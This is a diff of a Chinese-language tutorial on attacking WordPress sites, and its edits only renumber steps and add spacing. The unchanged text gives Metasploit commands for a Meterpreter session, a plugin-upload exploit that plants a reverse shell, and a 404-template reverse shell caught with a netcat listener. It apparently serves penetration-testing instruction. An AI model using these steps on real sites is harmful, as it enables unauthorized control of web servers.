@@ -52,12 +52,14 @@
     check                    # 验证配置和目标漏洞
     ```
     ![alt text](1.-Set-Metasploit-Options-.webp)
-4.  设置本地监听 IP 并执行攻击：
+    
+5.  设置本地监听 IP 并执行攻击：
     ```bash
     set LHOST 172.20.10.14   # 你的攻击机 IP
     run                      # 发射载荷
     ```
 ![alt text](2.-Meterpreter-session.webp)
+
 成功后，你将获得一个 **Meterpreter** 会话。运行 `help` 查看可用命令，例如 `lls` 可以列出服务器上的文件。
 
 -----
@@ -71,17 +73,20 @@ WordPress 支持插件，这让它功能强大，但也带来了风险。某些�
 
 1.  下载并在目标网站安装该插件。
    ![alt text](4.-Responsive-Thumbnail-Slider.webp)
+
 3.  启动 Metasploit 并加载对应模块：
     ```bash
     use exploit/multi/http/wp_responsive_thumbnail_slider_upload
     ```
     ![alt text](5.-Set-Meterpreter-options.webp)
-4.  设置参数（RHOST, TARGETURI, WPUSERNAME, WPPASSWORD）并运行。
+    
+5.  设置参数（RHOST, TARGETURI, WPUSERNAME, WPPASSWORD）并运行。
 
 该模块会自动完成身份验证并上传反弹 Shell，成功后你将直接获得 Web 服务器的控制权。
 
 -----
 ![alt text](6.-Start-Exploit.webp)
+
 ## 3\. 通过编辑 WordPress 主题建立反弹 Shell
 
 这种方法非常有趣，因为**不需要任何框架或第三方工具**。其核心逻辑是：
@@ -105,10 +110,13 @@ WordPress 支持插件，这让它功能强大，但也带来了风险。某些�
     nc -lnvp 8888
     ```
      ![alt text](8.-Start-Listener.webp)
-2.  在浏览器访问一个不存在的路径来触发 404 页面，例如：
+    
+3.  在浏览器访问一个不存在的路径来触发 404 页面，例如：
     `http://172.20.10.14/wordpress/index.php/dummydummy`
-3.  你的 Netcat 终端会立即建立连接，你可以直接运行 Linux 命令。
+4.  你的 Netcat 终端会立即建立连接，你可以直接运行 Linux 命令。
+
  ![alt text](9.-Reverse-Shell-Session.webp)
+
 -----
 
 ## 总结
